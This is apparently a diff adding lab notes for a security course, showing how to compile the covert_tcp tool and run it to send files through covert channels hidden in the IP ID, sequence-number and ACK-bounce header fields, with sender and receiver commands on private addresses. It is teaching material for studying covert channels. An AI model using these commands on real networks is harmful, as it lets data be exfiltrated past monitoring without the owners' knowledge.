@@ -1,0 +1,26 @@
+cd CS*/Lab01/Tools/co*/co*
+
+gcc -o covert_tcp covert_tcp.c
+
+V. Method One: Manipulation of the IP Identification Field 
+Client sender: 
+sudo ./covert_tcp -source 192.168.43.11 -dest 192.168.43.12 -dest_port 80 -file secret.txt
+
+Server receiver: 
+sudo ./covert_tcp -source 192.168.43.11 -dest_port -server -file received-secret.txt
+
+
+VI. Method Two: Initial Sequence Number Field 
+Client sender: 
+sudo ./covert_tcp -source 192.168.43.11 -dest 192.168.43.12 -dest_port 80 -seq -file secret2.txt 
+
+Server receiver: 
+sudo ./covert_tcp -source_port 80 -server -seq -file received-secret2.txt 
+
+
+VII. Method Three: The TCP Acknowledge Sequence Number Field "Bounce" 
+Client sender: 
+sudo ./covert_tcp -source 192.168.43.12 -source_port 80 -dest 192.168.43.11 -seq -file secret3.txt
+
+Server receiver: 
+sudo ./covert_tcp -source_port 80 -server -ack -file secret3.txt 
